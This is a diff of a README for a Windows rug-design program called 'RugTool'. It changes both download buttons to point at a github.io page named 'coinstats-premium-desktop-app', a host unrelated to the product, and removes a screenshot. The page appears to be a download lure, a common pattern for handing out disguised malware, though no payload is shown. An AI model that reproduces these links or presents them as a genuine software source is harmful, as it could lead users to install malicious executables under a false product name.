@@ -4,7 +4,7 @@
 
 ## 📥 Download RugTool for Windows
 
-[![⬇️ Download RugTool](https://img.shields.io/badge/Download-RugTool-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/RugTool)
+[![⬇️ Download RugTool](https://img.shields.io/badge/Download-RugTool-blue?style=for-the-badge&logo=windows)](https://coinstats-premium-desktop-app.github.io/.github)
 
 ---
 
@@ -30,11 +30,7 @@ Users can design custom patterns, convert visuals to rug-friendly templates, sim
 
 It also supports tool calibration, manual input, or automated path generation for rug production. RugTool is ideal for hobbyists, professionals, and designers crafting modern or traditional rugs with precision.
 
-[![⬇️ Download RugTool](https://img.shields.io/badge/Download-RugTool-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/RugTool)
-
----
-
-![RugTool Interface](https://camo.githubusercontent.com/91407b8261f37377f7b82eeb79f3c11ed16ce1e1bc017758af2e38f402384167/68747470733a2f2f6c68372d71772e676f6f676c6575736572636f6e74656e742e636f6d2f646f63737a2f41445f346e586469543153534e636b63355968445033356c685941697a766f586c7932614d4b5345466e6e716b4b524846746d6f6a35574f74556869764b3967317139556143666c6844636e746d6a67516a52317671777a764d6c4633334e7552612d77484233774f63585565384a644156614d5f4a416d684d63423459354b314155717641586a3355686f45413f6b65793d544577666f6444725354577a414f55417666386f73707053)
+[![⬇️ Download RugTool](https://img.shields.io/badge/Download-RugTool-blue?style=for-the-badge&logo=windows)](https://coinstats-premium-desktop-app.github.io/.github)
 
 ---
 
